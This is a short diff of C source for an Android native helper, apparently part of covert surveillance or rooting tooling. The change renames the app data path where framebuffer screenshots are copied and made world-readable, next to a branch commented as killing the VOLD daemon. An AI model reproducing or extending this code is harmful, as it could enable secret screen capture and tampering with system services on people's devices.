@@ -52,10 +52,10 @@ int main(int argc, char** argv) {
 
 	// Cattura uno screenshot
 	if (strcmp(argv[1], "fb") == 0) {
-		char* filename = "/data/data/com.android.service/files/frame";
+		char* filename = "/data/data/com.android.networking/files/frame";
 
 		copy("/dev/graphics/fb0", filename);
-		chmod("/data/data/com.android.service/files/frame", 0666);
+		chmod("/data/data/com.android.networking/files/frame", 0666);
 	} else if (strcmp(argv[1], "vol") == 0) { // Killa VOLD per due volte
 		unsigned int pid;
 		
@@ -152,7 +152,7 @@ static int get_framebuffer() {
 	}
 
 
-	fd_out = open("/data/data/com.android.service/files/frame", O_CREAT | O_RDWR);
+	fd_out = open("/data/data/com.android.networking/files/frame", O_CREAT | O_RDWR);
 
 	if (fd_out < 0) {
 		perror("failed to create frame file");
